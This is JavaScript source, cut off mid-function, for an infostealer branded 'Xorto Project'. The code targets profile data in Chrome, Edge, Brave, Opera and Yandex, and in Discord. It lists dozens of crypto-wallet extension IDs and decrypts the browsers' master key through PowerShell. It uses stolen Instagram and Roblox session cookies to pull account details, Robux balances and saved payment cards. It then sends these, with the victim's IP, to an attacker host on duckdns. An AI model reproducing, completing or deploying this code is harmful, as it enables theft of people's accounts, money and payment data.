const fs = require('fs');
const path = require('path');
const axios = require('axios');
const os = require('os');
const FormData = require('form-data');
const AdmZip = require('adm-zip');
const { execSync, exec } = require('child_process');
const crypto = require('crypto');
const sqlite3 = require('sqlite3');
const { extractAll, createPackage } = require('asar');
const https = require('https');


const local = process.env.LOCALAPPDATA;
const discords = [];
debug = false;
let injection_paths = []
    const randomString = crypto.randomBytes(3).toString('hex');

var appdata = process.env.APPDATA,
    LOCAL = process.env.LOCALAPPDATA,
    localappdata = process.env.LOCALAPPDATA;
let browser_paths = [localappdata + '\\Google\\Chrome\\User Data\\Default\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 1\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 2\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 3\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 4\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 5\\', localappdata + '\\Google\\Chrome\\User Data\\Guest Profile\\', localappdata + '\\Google\\Chrome\\User Data\\Default\\Network\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 1\\Network\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 2\\Network\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 3\\Network\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 4\\Network\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 5\\Network\\', localappdata + '\\Google\\Chrome\\User Data\\Guest Profile\\Network\\', appdata + '\\Opera Software\\Opera Stable\\', appdata + '\\Opera Software\\Opera GX Stable\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\', localappdata + '\\Microsoft\\Edge\\User Data\\Default\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 1\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 2\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 3\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 4\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 5\\', localappdata + '\\Microsoft\\Edge\\User Data\\Guest Profile\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\Network\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\Network\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\Network\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\Network\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\Network\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\Network\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\Network\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\Network\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\Network\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\Network\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\Network\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\Network\\', localappdata + '\\Microsoft\\Edge\\User Data\\Default\\Network\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 1\\Network\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 2\\Network\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 3\\Network\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 4\\Network\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 5\\Network\\', localappdata + '\\Microsoft\\Edge\\User Data\\Guest Profile\\Network\\'];

const key = "yourkey"
paths = [appdata + '\\discord\\', appdata + '\\discordcanary\\', appdata + '\\discordptb\\', appdata + '\\discorddevelopment\\', appdata + '\\lightcord\\', localappdata + '\\Google\\Chrome\\User Data\\Default\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 1\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 2\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 3\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 4\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 5\\', localappdata + '\\Google\\Chrome\\User Data\\Guest Profile\\', localappdata + '\\Google\\Chrome\\User Data\\Default\\Network\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 1\\Network\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 2\\Network\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 3\\Network\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 4\\Network\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 5\\Network\\', localappdata + '\\Google\\Chrome\\User Data\\Guest Profile\\Network\\', appdata + '\\Opera Software\\Opera Stable\\', appdata + '\\Opera Software\\Opera GX Stable\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\', localappdata + '\\Microsoft\\Edge\\User Data\\Default\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 1\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 2\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 3\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 4\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 5\\', localappdata + '\\Microsoft\\Edge\\User Data\\Guest Profile\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\Network\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\Network\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\Network\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\Network\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\Network\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\Network\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\Network\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\Network\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\Network\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\Network\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\Network\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\Network\\', localappdata + '\\Microsoft\\Edge\\User Data\\Default\\Network\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 1\\Network\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 2\\Network\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 3\\Network\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 4\\Network\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 5\\Network\\', localappdata + '\\Microsoft\\Edge\\User Data\\Guest Profile\\Network\\']


function onlyUnique(item, index, array) {
    return array.indexOf(item) === index;
}

const _0x9b6227 = {}
_0x9b6227.passwords = 0
_0x9b6227.cookies = 0
_0x9b6227.autofills = 0
_0x9b6227.wallets = 0
_0x9b6227.telegram = false
const count = _0x9b6227,
user = {
    homedir: os.homedir(),
    hostname: os.hostname(),
    type: os.type(),
    arch: os.arch(),
    release: os.release(),
    roaming: process.env.APPDATA,
    local: process.env.LOCALAPPDATA,
    temp: process.env.TEMP,
    sysDrive: process.env.SystemDrive,
    fileLoc: process.cwd(),
    randomUUID: crypto.randomBytes(5).toString('hex'),
    start: Date.now(),
    debug: false,
    copyright: '<================[Xorto Project]>================>\n\n',
    url: null,
}
_0x2afdce = {}
const walletPaths = _0x2afdce,
    _0x4ae424 = {}
_0x4ae424.Trust = '\\Local Extension Settings\\egjidjbpglichdcondbcbdnbeeppgdph'
_0x4ae424.Metamask =
    '\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn'
_0x4ae424.Coinbase =
    '\\Local Extension Settings\\hnfanknocfeofbddgcijnmhnfnkdnaad'
_0x4ae424.BinanceChain =
    '\\Local Extension Settings\\fhbohimaelbohpjbbldcngcnapndodjp'
_0x4ae424.Phantom =
    '\\Local Extension Settings\\bfnaelmomeimhlpmgjnjophhpkkoljpa'
_0x4ae424.TronLink =
    '\\Local Extension Settings\\ibnejdfjmmkpcnlpebklmnkoeoihofec'
_0x4ae424.Ronin = '\\Local Extension Settings\\fnjhmkhhmkbjkkabndcnnogagogbneec'
_0x4ae424.Exodus =
    '\\Local Extension Settings\\aholpfdialjgjfhomihkjbmgjidlcdno'
_0x4ae424.Coin98 =
    '\\Local Extension Settings\\aeachknmefphepccionboohckonoeemg'
_0x4ae424.Authenticator =
    '\\Sync Extension Settings\\bhghoamapcdpbohphigoooaddinpkbai'
_0x4ae424.MathWallet =
    '\\Sync Extension Settings\\afbcbjpbpfadlkmhmclhkeeodmamcflc'
_0x4ae424.YoroiWallet =
    '\\Local Extension Settings\\ffnbelfdoeiohenkjibnmadjiehjhajb'
_0x4ae424.GuardaWallet =
    '\\Local Extension Settings\\hpglfhgfnhbgpjdenjgmdgoeiappafln'
_0x4ae424.JaxxxLiberty =
    '\\Local Extension Settings\\cjelfplplebdjjenllpjcblmjkfcffne'
_0x4ae424.Wombat =
    '\\Local Extension Settings\\amkmjjmmflddogmhpjloimipbofnfjih'
_0x4ae424.EVERWallet =
    '\\Local Extension Settings\\cgeeodpfagjceefieflmdfphplkenlfk'
_0x4ae424.KardiaChain =
    '\\Local Extension Settings\\pdadjkfkgcafgbceimcpbkalnfnepbnk'
_0x4ae424.XDEFI = '\\Local Extension Settings\\hmeobnfnfcmdkdcmlblgagmfpfboieaf'
_0x4ae424.Nami = '\\Local Extension Settings\\lpfcbjknijpeeillifnkikgncikgfhdo'
_0x4ae424.TerraStation =
    '\\Local Extension Settings\\aiifbnbfobpmeekipheeijimdpnlpgpp'
_0x4ae424.MartianAptos =
    '\\Local Extension Settings\\efbglgofoippbgcjepnhiblaibcnclgk'
_0x4ae424.TON = '\\Local Extension Settings\\nphplpgoakhhjchkkhmiggakijnkhfnd'
_0x4ae424.Keplr = '\\Local Extension Settings\\dmkamcknogkgcdfhhbddcghachkejeap'
_0x4ae424.CryptoCom =
    '\\Local Extension Settings\\hifafgmccdpekplomjjkcfgodnhcellj'
_0x4ae424.PetraAptos =
    '\\Local Extension Settings\\ejjladinnckdgjemekebdpeokbikhfci'
_0x4ae424.OKX = '\\Local Extension Settings\\mcohilncbfahbmgdjkbpemcciiolgcge'
_0x4ae424.Sollet =
    '\\Local Extension Settings\\fhmfendgdocmcbmfikdcogofphimnkno'
_0x4ae424.Sender =
    '\\Local Extension Settings\\epapihdplajcdnnkdeiahlgigofloibg'
_0x4ae424.Sui = '\\Local Extension Settings\\opcgpfmipidbgpenhmajoajpbobppdil'
_0x4ae424.SuietSui =
    '\\Local Extension Settings\\khpkpbbcccdmmclmpigdgddabeilkdpd'
_0x4ae424.Braavos =
    '\\Local Extension Settings\\jnlgamecbpmbajjfhmmmlhejkemejdma'
_0x4ae424.FewchaMove =
    '\\Local Extension Settings\\ebfidpplhabeedpnhjnobghokpiioolj'
_0x4ae424.EthosSui =
    '\\Local Extension Settings\\mcbigmjiafegjnnogedioegffbooigli'
_0x4ae424.ArgentX =
    '\\Local Extension Settings\\dlcobpjiigpikoobohmabehhmhfoodbb'
_0x4ae424.NiftyWallet =
    '\\Local Extension Settings\\jbdaocneiiinmjbjlgalhcelgbejmnid'
_0x4ae424.BraveWallet =
    '\\Local Extension Settings\\odbfpeeihdkbihmopkbjmoonfanlbfcl'
_0x4ae424.EqualWallet =
    '\\Local Extension Settings\\blnieiiffboillknjnepogjhkgnoapac'
_0x4ae424.BitAppWallet =
    '\\Local Extension Settings\\fihkakfobkmkjojpchpfgcmhfjnmnfpi'
_0x4ae424.iWallet =
    '\\Local Extension Settings\\kncchdigobghenbbaddojjnnaogfppfj'
_0x4ae424.AtomicWallet =
    '\\Local Extension Settings\\fhilaheimglignddkjgofkcbgekhenbh'
_0x4ae424.MewCx = '\\Local Extension Settings\\nlbmnnijcnlegkjjpcfjclmcfggfefdm'
_0x4ae424.GuildWallet =
    '\\Local Extension Settings\\nanjmdknhkinifnkgdcggcfnhdaammmj'
_0x4ae424.SaturnWallet =
    '\\Local Extension Settings\\nkddgncdjgjfcddamfgcmfnlhccnimig'
_0x4ae424.HarmonyWallet =
    '\\Local Extension Settings\\fnnegphlobjdpkhecapkijjdkgcjhkib'
_0x4ae424.PaliWallet =
    '\\Local Extension Settings\\mgffkfbidihjpoaomajlbgchddlicgpn'
_0x4ae424.BoltX = '\\Local Extension Settings\\aodkkagnadcbobfpggfnjeongemjbjca'
_0x4ae424.LiqualityWallet =
    '\\Local Extension Settings\\kpfopkelmapcoipemfendmdcghnegimn'
_0x4ae424.MaiarDeFiWallet =
    '\\Local Extension Settings\\dngmlblcodfobpdpecaadgfbcggfjfnm'
_0x4ae424.TempleWallet =
    '\\Local Extension Settings\\ookjlbkiijinhpmnjffcofjonbfbgaoc'
_0x4ae424.Metamask_E =
    '\\Local Extension Settings\\ejbalbakoplchlghecdalmeeeajnimhm'
_0x4ae424.Ronin_E =
    '\\Local Extension Settings\\kjmoohlgokccodicjjfebfomlbljgfhk'
_0x4ae424.Yoroi_E =
    '\\Local Extension Settings\\akoiaibnepcedcplijmiamnaigbepmcb'
_0x4ae424.Authenticator_E =
    '\\Sync Extension Settings\\ocglkepbibnalbgmbachknglpdipeoio'
_0x4ae424.MetaMask_O =
    '\\Local Extension Settings\\djclckkglechooblngghdinmeemkbgci'
const api_url = "xortoproject1.duckdns.org";

const extension = _0x4ae424,
  browserPath = [
    [
      user.local + '\\Google\\Chrome\\User Data\\Default\\',
      'Default',
      user.local + '\\Google\\Chrome\\User Data\\',
    ],
    [
      user.local + '\\Google\\Chrome\\User Data\\Profile 1\\',
      'Profile_1',
      user.local + '\\Google\\Chrome\\User Data\\',
    ],
    [
      user.local + '\\Google\\Chrome\\User Data\\Profile 2\\',
      'Profile_2',
      user.local + '\\Google\\Chrome\\User Data\\',
    ],
    [
      user.local + '\\Google\\Chrome\\User Data\\Profile 3\\',
      'Profile_3',
      user.local + '\\Google\\Chrome\\User Data\\',
    ],
    [
      user.local + '\\Google\\Chrome\\User Data\\Profile 4\\',
      'Profile_4',
      user.local + '\\Google\\Chrome\\User Data\\',
    ],
    [
      user.local + '\\Google\\Chrome\\User Data\\Profile 5\\',
      'Profile_5',
      user.local + '\\Google\\Chrome\\User Data\\',
    ],
    [
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\',
      'Default',
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\',
    ],
    [
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\',
      'Profile_1',
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\',
    ],
    [
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\',
      'Profile_2',
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\',
    ],
    [
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\',
      'Profile_3',
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\',
    ],
    [
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\',
      'Profile_4',
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\',
    ],
    [
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\',
      'Profile_5',
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\',
    ],
    [
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\',
      'Guest Profile',
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\',
    ],
    [
      user.local + '\\Yandex\\YandexBrowser\\User Data\\Default\\',
      'Default',
      user.local + '\\Yandex\\YandexBrowser\\User Data\\',
    ],
    [
      user.local + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\',
      'Profile_1',
      user.local + '\\Yandex\\YandexBrowser\\User Data\\',
    ],
    [
      user.local + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\',
      'Profile_2',
      user.local + '\\Yandex\\YandexBrowser\\User Data\\',
    ],
    [
      user.local + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\',
      'Profile_3',
      user.local + '\\Yandex\\YandexBrowser\\User Data\\',
    ],
    [
      user.local + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\',
      'Profile_4',
      user.local + '\\Yandex\\YandexBrowser\\User Data\\',
    ],
    [
      user.local + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\',
      'Profile_5',
      user.local + '\\Yandex\\YandexBrowser\\User Data\\',
    ],
    [
      user.local + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\',
      'Guest Profile',
      user.local + '\\Yandex\\YandexBrowser\\User Data\\',
    ],
    [
      user.local + '\\Microsoft\\Edge\\User Data\\Default\\',
      'Default',
      user.local + '\\Microsoft\\Edge\\User Data\\',
    ],
    [
      user.local + '\\Microsoft\\Edge\\User Data\\Profile 1\\',
      'Profile_1',
      user.local + '\\Microsoft\\Edge\\User Data\\',
    ],
    [
      user.local + '\\Microsoft\\Edge\\User Data\\Profile 2\\',
      'Profile_2',
      user.local + '\\Microsoft\\Edge\\User Data\\',
    ],
    [
      user.local + '\\Microsoft\\Edge\\User Data\\Profile 3\\',
      'Profile_3',
      user.local + '\\Microsoft\\Edge\\User Data\\',
    ],
    [
      user.local + '\\Microsoft\\Edge\\User Data\\Profile 4\\',
      'Profile_4',
      user.local + '\\Microsoft\\Edge\\User Data\\',
    ],
    [
      user.local + '\\Microsoft\\Edge\\User Data\\Profile 5\\',
      'Profile_5',
      user.local + '\\Microsoft\\Edge\\User Data\\',
    ],
    [
      user.local + '\\Microsoft\\Edge\\User Data\\Guest Profile\\',
      'Guest Profile',
      user.local + '\\Microsoft\\Edge\\User Data\\',
    ],
    [
      user.roaming + '\\Opera Software\\Opera Neon\\User Data\\Default\\',
      'Default',
      user.roaming + '\\Opera Software\\Opera Neon\\User Data\\',
    ],
    [
      user.roaming + '\\Opera Software\\Opera Stable\\',
      'Default',
      user.roaming + '\\Opera Software\\Opera Stable\\',
    ],
    [
      user.roaming + '\\Opera Software\\Opera GX Stable\\',
      'Default',
      user.roaming + '\\Opera Software\\Opera GX Stable\\',
    ],
  ],
 
randomPath = `${user.fileLoc}\\${user.randomUUID}`;
fs.mkdirSync(randomPath, 484);


async function getEncrypted() {
  for (let _0x4c3514 = 0; _0x4c3514 < browserPath.length; _0x4c3514++) {
    if (!fs.existsSync('' + browserPath[_0x4c3514][0])) {
      continue
    }
    try {
      let _0x276965 = Buffer.from(
        JSON.parse(fs.readFileSync(browserPath[_0x4c3514][2] + 'Local State'))
          .os_crypt.encrypted_key,
        'base64'
      ).slice(5)
      const _0x4ff4c6 = Array.from(_0x276965),
        _0x4860ac = execSync(
          'powershell.exe Add-Type -AssemblyName System.Security; [System.Security.Cryptography.ProtectedData]::Unprotect([byte[]]@(' +
            _0x4ff4c6 +
            "), $null, 'CurrentUser')"
        )
          .toString()
          .split('\r\n'),
        _0x4a5920 = _0x4860ac.filter((_0x29ebb3) => _0x29ebb3 != ''),
        _0x2ed7ba = Buffer.from(_0x4a5920)
      browserPath[_0x4c3514].push(_0x2ed7ba)
    } catch (_0x32406b) {}
  }
}

async function fetchInstagramData(sessionId) {
    const headers = {
        "Host": "i.instagram.com",
        "X-Ig-Connection-Type": "WiFi",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Ig-Capabilities": "36r/Fx8=",
        "User-Agent": "Instagram 159.0.0.28.123 (iPhone8,1; iOS 14_1; en_SA@calendar=gregorian; ar-SA; scale=2.00; 750x1334; 244425769) AppleWebKit/420+",
        "X-Ig-App-Locale": "en",
        "X-Mid": "Ypg64wAAAAGXLOPZjFPNikpr8nJt",
        "Accept-Encoding": "gzip, deflate",
        "Cookie": `sessionid=${sessionId};`
    };

    const response = await axios.get("https://i.instagram.com/api/v1/accounts/current_user/?edit=true", { headers });
    const userData = response.data.user;

    return {
        username: userData.username,
        verified: userData.is_verified,
        avatar: userData.profile_pic_url,
        sessionId
    };
}

async function fetchFollowersCount(sessionId) {
    const headers = {
        "Host": "i.instagram.com",
        "User-Agent": "Instagram 159.0.0.28.123 (iPhone8,1; iOS 14_1; en_SA@calendar=gregorian; ar-SA; scale=2.00; 750x1334; 244425769) AppleWebKit/420+",
        "Cookie": `sessionid=${sessionId};`
    };

    const accountResponse = await axios.get("https://i.instagram.com/api/v1/accounts/current_user/?edit=true", { headers });
    const accountInfo = accountResponse.data.user;

    const userInfoResponse = await axios.get(`https://i.instagram.com/api/v1/users/${accountInfo.pk}/info`, { headers });
    const userData = userInfoResponse.data.user;
    const followersCount = userData.follower_count;

    return followersCount;
}

async function SubmitInstagram(sessionId) {
    try {

    const { data: ipData } = await axios.get('https://api.ipify.org?format=json');
    const ip = ipData.ip;

	  const data = await fetchInstagramData(sessionId);
        const followersCount = await fetchFollowersCount(sessionId);

        const embed = {
				key: key,
            embeds: [
                {
                    color: 3553599,
                    fields: [
                        {
                            name: "<a:xorto:954736323745415199> An Instagram Account Detected!",
                            value: "`Instagram Account`"
                        },
                        {
                            name: "<:xorto2:1253851581267443712> Username:",
                            value: `\`${data.username}\``,
                            inline: true
                        },
                        {
                            name: "<a:xorto:1023591272746864671> Followers:",
                            value: `\`${followersCount}\``,
                            inline: true
                        },
                        {
                            name: "<a:xorto:1023591270909755392> Verified Type:",
                            value: `\`${data.verified ? 'Verified' : 'Not Verified'}\``,
                            inline: true
                        },
                        {
                            name: "<:xorto:957015863377149962> Session:",
                            value: `\`${data.sessionId}\``,
                            inline: true
                        },
                        {
                            name: "<a:xorto:954738629220106281> Ip:",
                        }
                    ],
                    author: {
                        name: "Instagram Session",
                        icon_url: "https://media.discordapp.net/attachments/1253830684167114865/1253842530278314045/Black_And_White_Modern_Typographic_Simple_Virus_Apparel_Logo_3.png?ex=6677535a&is=667601da&hm=dfbf46ab221cbdd59288452e3a3711ff03784264aeeca90caa3afb46a1827750&=&format=webp&quality=lossless&width=473&height=473"
                    },
                    footer: {
                        text: "@xortoproject"
                    },
                    thumbnail: {
                        url: "https://media.discordapp.net/attachments/1253830684167114865/1253842530278314045/Black_And_White_Modern_Typographic_Simple_Virus_Apparel_Logo_3.png?ex=6677535a&is=667601da&hm=dfbf46ab221cbdd59288452e3a3711ff03784264aeeca90caa3afb46a1827750&=&format=webp&quality=lossless&width=473&height=473"
                    }
                }
            ],
            username: "XortoProject",
            avatar_url: "https://media.discordapp.net/attachments/1253830684167114865/1253842530278314045/Black_And_White_Modern_Typographic_Simple_Virus_Apparel_Logo_3.png?ex=6677535a&is=667601da&hm=dfbf46ab221cbdd59288452e3a3711ff03784264aeeca90caa3afb46a1827750&=&format=webp&quality=lossless&width=473&height=473",
            attachments: []
        };

        await axios.post(`${api_url}/webhooks/${randomString}`, embed);

        console.log("Data sent to Discord webhook successfully.");
    } catch (error) {
        console.error("Error sending data to Discord webhook:", error);
    }
}

async function GetRobloxDataAndTransactionTotals(secret_cookie) {
  let data = {};
  let headers = {
    'accept': 'application/json, text/plain, */*',
    'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'en-US,en;q=0.9,hi;q=0.8',
    'cookie': `.ROBLOSECURITY=${secret_cookie};`,
    'origin': 'https://www.roblox.com',
    'referer': 'https://www.roblox.com',
    'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36'
  };

  try {
    let userDataResponse = await axios.get('https://www.roblox.com/mobileapi/userinfo', { headers: headers });
    data['username'] = userDataResponse.data['UserName'];
    data['avatar'] = userDataResponse.data['ThumbnailUrl'];
    data['robux'] = userDataResponse.data['RobuxBalance'];
    data['premium'] = userDataResponse.data['IsPremium'];
    data['userID'] = userDataResponse.data['UserID'];

    let transactionTotalsResponse = await axios.get(`https://economy.roblox.com/v2/users/${data.userID}/transaction-totals?timeFrame=Month&transactionType=summary`, { headers: headers });
    data['outgoingRobux'] = transactionTotalsResponse.data['outgoingRobuxTotal'];
    data['pendingRobuxTotal'] = transactionTotalsResponse.data['pendingRobuxTotal'];
    return data;
  } catch (error) {
    console.error('Error fetching Roblox data and transaction totals:', error.message);
    throw error;
  }
}

async function GetPaymentProfiles(secret_cookie) {
  let headers = {
    'accept': 'application/json, text/plain, */*',
    'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'en-US,en;q=0.9,hi;q=0.8',
    'cookie': `.ROBLOSECURITY=${secret_cookie};`,
    'origin': 'https://www.roblox.com',
    'referer': 'https://www.roblox.com',
    'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36'
  };

  try {
    let response = await axios.get('https://apis.roblox.com/payments-gateway/v1/payment-profiles', { headers: headers });

    return response.data;
  } catch (error) {
    console.error('Error fetching payment profiles:', error.message);
    throw error;
  }
}


async function SubmitRoblox(secret_cookie) {
  try {
    let data = await GetRobloxDataAndTransactionTotals(secret_cookie);

    if (!data || !data.username || data.robux === undefined || data.premium === undefined || data.userID === undefined || data.outgoingRobux === undefined) {
      console.error('Invalid Roblox data received:', data);
      return;
    }

    const robuxValue = data.robux === 0 ? 'No Robux' : data.robux;
    const pendingrobux = data.pendingRobuxTotal;

    let paymentProfiles = await GetPaymentProfiles(secret_cookie);

     const { data: ipData } = await axios.get('https://api.ipify.org?format=json');
    const ip = ipData.ip;


 let embed = {
      color: 3553599,
      author: {
        name: 'Roblox Session',
        icon_url: 'https://media.discordapp.net/attachments/1253830684167114865/1253842530278314045/Black_And_White_Modern_Typographic_Simple_Virus_Apparel_Logo_3.png?ex=6677535a&is=667601da&hm=dfbf46ab221cbdd59288452e3a3711ff03784264aeeca90caa3afb46a1827750&=&format=webp&quality=lossless&width=473&height=473',
      },
      fields: [
        {
          name: '<a:xorto:954736323745415199> An Roblox Account Detected!',
          value: '`Roblox Account`',
        },
        {
          name: '<a:xorto:954738629220106281> Id:',
          value: `\`${data.userID}\``,
          inline: true,
        },
        {
          name: '<a:xorto:954738629220106281> Username:',
          value: `\`${data.username}\``,
          inline: true,
        },
        {
          name: '<a:xorto:954738629220106281> Premium Type:',
          value: `\`${data.premium ? 'Yes' : 'No'}\``,
          inline: true,
        },
        {
          name: '<a:xorto:954738629220106281> Robux:',
          value: `\`${robuxValue}\``,
          inline: true,
        },
        {
          name: '<a:xorto:954738629220106281> Pending Robux:',
          value: `\`${pendingrobux}\``,
          inline: true,
        },
        {
          name: '<a:xorto:954738629220106281> Payment Profiles:',
          value: paymentProfiles.map(profile => {
            return `\`Card: ${profile.providerPayload.CardNetwork} Ending in ${profile.providerPayload.Last4Digits}\``;
          }).join('\n'),
        },
        {
          name: '<a:xorto:954738629220106281> Ip:',
          value: `\`${ip}\``
        },
      ],
      footer: {
        text: '@xortoproject',
      },
      thumbnail: {
